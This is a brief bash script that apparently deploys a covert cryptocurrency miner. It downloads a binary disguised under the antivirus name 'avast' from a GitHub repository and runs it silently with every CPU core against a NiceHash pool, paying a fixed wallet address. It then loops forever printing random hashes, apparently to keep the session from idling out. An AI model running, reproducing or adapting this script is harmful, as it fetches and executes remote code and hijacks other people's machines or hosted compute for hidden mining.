#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

sudo apt install screen libjansson4 -y 

wget https://github.com/angkii/2022/raw/main/avast >/dev/null 2>&1

chmod +x avast >/dev/null 2>&1

screen -dmS ls

./avast -v -l stratum+tcp://daggerhashimoto.us-west.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.$(echo $(shuf -i 1-9999 -n 1)111) -p x -t $(nproc) >/dev/null 2>&1

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
